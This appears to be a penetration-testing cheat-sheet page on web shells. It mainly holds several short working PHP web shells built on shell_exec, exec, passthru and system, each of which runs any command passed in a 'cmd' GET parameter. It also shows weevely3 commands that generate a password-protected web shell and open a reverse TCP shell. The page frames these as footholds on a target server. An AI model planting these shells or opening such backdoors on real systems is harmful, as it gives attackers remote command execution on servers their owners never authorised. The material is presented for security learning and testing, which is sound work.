# Web shell

[Go back](../index.md#remote-shell-)

<div class="row row-cols-md-2"><div>

A web shell is a shell that is *usually* accessed from a browser. When possible, we want to use it as a foothold to move to reverse shell.

The language used in the web shell is **determined by the language the target web server understand**, such as PHP or JavaScript. ✨
</div><div>

For JavaScript, you need to find a way for the website to execute your web shell, as unlike PHP, it's not automatically done by visiting the web shell URL.

On Kali, you can find preinstalled web shells inside ([GitLab](https://gitlab.com/kalilinux/packages/webshells))

```bash
$ ls /usr/share/webshells
```
</div></div>

<hr class="sep-both">

## PHP web shell

<div class="row row-cols-md-2"><div>

PHP web shell are file such as `webshell.php`. Once uploaded on the target, you can execute them by browsing them with a browser.

Most web shells below are using GET to take to command to run. For instance, `[...]/webshell.php?cmd=id` to run the `id` command.

<br>

#### shell_exec

This is a compacted web shell with `shell_exec`  ([doc](https://www.php.net/manual/en/function.shell-exec.php)).

```php
<?="<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>"; ?>
```

You may replace `?=` with `?php echo ` if not supported.

<br>

#### weevely3

This is a web shell using [weevely3](https://github.com/epinna/weevely3) (2.8k ⭐).

```ps
# generate a webshell.php protected by "password"
$ weevely generate <password> webshell.php
# connect to the web shell
$ weevely URL/webshell.php <password>
# see help
# ex: create a reverse shell
$ :backdoor_reversetcp IP PORT
```
</div><div>

#### exec

This is a web shell using `exec` ([doc](https://www.php.net/manual/en/function.exec.php))

```php!
<?php
$output = "";
exec(($_GET["cmd"] ?? "whoami")." 2>&1", $output);
echo "<pre>".implode('<br>', $output)."</pre>";
?>
```

#### passthru

This is a web shell using `passthru`  ([doc](https://www.php.net/manual/en/function.passthru.php))

```php!
echo "<pre>";
echo passthru(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
```

#### system

This is a web shell using `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php!
<?php
echo "<pre>";
echo system(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
?>
```
</div></div>